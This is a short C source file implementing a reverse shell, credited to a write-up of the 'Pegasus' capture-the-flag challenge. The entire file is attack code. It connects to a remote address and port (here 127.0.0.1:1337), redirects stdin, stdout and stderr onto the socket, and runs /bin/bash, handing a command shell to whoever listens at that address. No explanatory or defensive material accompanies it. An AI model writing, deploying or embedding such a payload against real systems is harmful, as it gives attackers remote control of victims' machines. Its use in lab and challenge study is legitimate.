/* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 1337

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = 2; // AF_INET
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT); // hex(1337) = 0x0539;  htons(1337) = 3905
    
    s = socket(2, 1, 0);  // AF_INET = 2 ; SOCK_STREAM = 1;
    
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/bash", 0, 0);
    return 0;
}
